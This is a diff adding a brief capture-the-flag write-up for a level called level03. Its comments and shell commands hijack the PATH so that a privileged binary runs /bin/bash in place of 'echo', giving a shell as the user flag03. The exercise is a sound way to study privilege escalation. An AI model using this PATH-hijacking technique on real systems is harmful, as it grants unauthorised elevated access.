@@ -1,0 +1,12 @@
+#if you enter ls you will see a file called level03 with flag03 as an owner
+#there is a way to get to user flag03 by executing bash but since we don't have permission
+#we will use the level03 file to execute bash command
+#we can ovveride the echo commande that is inside the level03 file
+
+echo "/bin/bash" > /tmp/echo
+chmod 777 /tmp/echo && export PATH=/tmp:$PATH
+./level03
+
+#now that we overrid the echo command when we will execute level03
+#our system will look for echo on the path and the first one he will find is /tmp/echo
+and we will be in flag03 :D !! 
